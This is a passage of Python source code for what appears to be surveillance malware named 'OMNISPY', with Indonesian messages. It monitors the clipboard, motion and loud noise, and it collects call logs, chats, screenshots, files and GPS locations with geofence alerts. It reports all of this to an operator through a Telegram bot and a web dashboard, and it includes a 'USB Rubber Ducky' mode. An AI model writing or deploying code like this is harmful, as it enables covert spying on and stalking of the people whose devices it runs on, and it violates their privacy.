    bot.reply_to(message, f"📱 SMS dikirim ke {number}")

@bot.message_handler(commands=['calllog'])
def handle_calllog(message):
    bot.reply_to(message, "📞 Mengambil call log (simulasi)...")
    threading.Thread(target=get_call_log).start()

# ============================================================
# TELEGRAM LISTENER (BACKGROUND THREAD)
# ============================================================
def telegram_listener():
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id+1}"
            r = requests.get(url, timeout=10)
            data = r.json()
            for result in data.get('result', []):
                last_update_id = result['update_id']
                message = result.get('message', {})
                if 'text' in message:
                    text = message['text']
                    chat_id = message['chat']['id']
                    save_log(device_id, 'telegram', f"Chat {chat_id}: {text}")
                    if any(word in text.lower() for word in sensitive_words):
                        send_notification(f"Kata sensitif terdeteksi: {text[:50]}")
                elif 'photo' in message:
                    save_log(device_id, 'screenshot', 'Screenshot diterima')
                elif 'document' in message:
                    save_log(device_id, 'file', 'File diterima')
                elif 'location' in message:
                    loc = message['location']
                    save_log(device_id, 'gps', f"Lokasi: {loc['latitude']}, {loc['longitude']}")
                    check_geofence(loc['latitude'], loc['longitude'])
        except:
            pass
        time.sleep(1)

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    try:
        send_message("🕵️ OMNISPY Active!")
        send_message("📌 Kirim /help untuk daftar perintah")
        send_notification("Perangkat terdaftar dan aktif")
        send_message("🌐 Dashboard web: http://localhost:5000")
        
        # Cek USB Rubber Ducky Mode
        if usb_rubber_ducky():
            send_notification("💾 USB Rubber Ducky Mode: ACTIVE")
        
        scheduler_thread = threading.Thread(target=start_scheduler, daemon=True)
        scheduler_thread.start()
        
        motion_thread = threading.Thread(target=detect_motion, daemon=True)
        motion_thread.start()
        
        clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipboard_thread.start()
        
        noise_thread = threading.Thread(target=detect_loud_noise, daemon=True)
        noise_thread.start()
        
        listener_thread = threading.Thread(target=telegram_listener, daemon=True)
        listener_thread.start()
        
        def bot_polling():
            bot.polling(none_stop=True, interval=0)
        polling_thread = threading.Thread(target=bot_polling, daemon=True)
        polling_thread.start()
        
        socketio.run(app, host='0.0.0.0', port=5000, debug=False)
    except Exception as e:
        send_message(f"⚠️ Error: {str(e)}")
        time.sleep(5)
